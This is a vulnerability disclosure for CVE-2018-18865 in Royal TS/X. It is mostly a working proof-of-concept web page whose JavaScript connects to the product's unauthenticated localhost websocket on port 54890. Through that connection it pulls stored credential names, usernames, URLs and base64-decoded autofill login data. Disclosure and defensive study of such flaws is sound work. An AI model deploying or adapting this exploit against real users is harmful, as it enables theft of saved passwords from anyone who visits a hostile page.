Author: Jakub Palaczynski
CVE: CVE-2018-18865

Affected product:
=============

Royal TS/X < Royal TS v5 Beta / Royal TSX v4 Beta


Vulnerability - Information Disclosure:
=============================

Any third party web application can steal credentials created in Royal TS/X
when browser extension is enabled.
Browser extension communicates using websockets (default TCP port 54890)
and websockets do not use any validation to verify origin of the request.


PoC website:
==========

  <!DOCTYPE html>
  <meta charset="utf-8" />
  <title>RoyalTS/X Exploit</title>
  <script language="javascript" type="text/javascript">

  var wsUri = "ws://127.0.0.1:54890/";
  var output;

  function init()
  {
    output = document.getElementById("output");
    testWebSocket();
  }

  function testWebSocket()
  {
writeToScreen("Let&#039;s retrieve some data...");
    websocket = new WebSocket(wsUri);
    websocket.onopen = function(evt) {
onOpen(evt,"{\"Command\":\"GetDocuments\",\"Arguments\":null,\"PluginVersion\":\"1.0.0.0\",\"RequestId\":\"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\"}")
};
    websocket.onclose = function(evt) { onClose(evt) };
    websocket.onmessage = function(evt) { onMessage(evt) };
    websocket.onerror = function(evt) { onError(evt) };
  }

  function onOpen(evt,message)
  {
    doSend(message);
  }

  function onClose(evt)
  {
  }

  function onMessage(evt)
  {
var obj = JSON.parse(evt.data);
if (obj[&#039;Command&#039;] == "GetDocuments") {
for (var x in obj[&#039;ResponseData&#039;]){
writeToScreen("Name: " + obj[&#039;ResponseData&#039;][x][&#039;Name&#039;]);
writeToScreen("Unlocked: " + obj[&#039;ResponseData&#039;][x][&#039;Unlocked&#039;]);
for (var y in obj[&#039;ResponseData&#039;][x][&#039;Credentials&#039;]){
writeToScreen("Username: " +
obj[&#039;ResponseData&#039;][x][&#039;Credentials&#039;][y][&#039;UserName&#039;]);
writeToScreen("URL: " + obj[&#039;ResponseData&#039;][x][&#039;Credentials&#039;][y][&#039;URL&#039;]);
if (obj[&#039;ResponseData&#039;][x][&#039;Unlocked&#039;] == true){
websocket.close();
websocket = new WebSocket(wsUri);
websocket.onopen = function(evt) {
onOpen(evt,"{\"Command\":\"GetLoginInformation\",\"Arguments\":{\"CredentialId\":\""
+ obj[&#039;ResponseData&#039;][x][&#039;Credentials&#039;][y][&#039;ID&#039;] +
"\"},\"PluginVersion\":\"1.0.0.0\",\"RequestId\":\"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\"}")
};
websocket.onclose = function(evt) { onClose(evt) };
websocket.onmessage = function(evt) { onMessage(evt) };
websocket.onerror = function(evt) { onError(evt) };
}
}
}
}
else {
if (obj[&#039;Command&#039;] == "GetLoginInformation") {
var obj = JSON.parse(evt.data);
writeToScreen("AutoFill Data: " + atob(obj[&#039;ResponseData&#039;]));
}
}
  }

  function onError(evt)
  {
    writeToScreen(&#039;<span style="color: red;">ERROR:</span> &#039; + evt.data);
  }

  function doSend(message)
  {
    websocket.send(message);
  }

  function writeToScreen(message)
  {
  }

  window.addEventListener("load", init, false);

  </script>

  <h2>RoyalTS/X Exploit</h2>

  <div id="output"></div>

